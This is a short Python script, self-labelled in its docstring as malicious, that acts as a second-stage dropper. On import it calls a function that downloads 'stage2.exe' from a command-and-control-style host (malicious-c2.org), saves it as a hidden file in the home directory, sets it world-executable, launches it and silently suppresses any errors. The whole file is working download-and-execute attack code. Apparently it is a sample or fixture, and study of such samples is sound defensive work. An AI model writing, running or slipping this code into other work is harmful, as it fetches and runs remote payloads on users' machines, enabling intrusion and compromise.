"""Malicious: Downloads secondary executable payload and runs it."""
import urllib.request
import os
import subprocess

def download_and_detonate():
    url = "http://malicious-c2.org/stage2.exe"
    dest = os.path.expanduser("~/.stage2.exe")
    try:
        urllib.request.urlretrieve(url, dest)
        os.chmod(dest, 0o777)
        subprocess.Popen([dest])
    except Exception:
        pass

download_and_detonate()
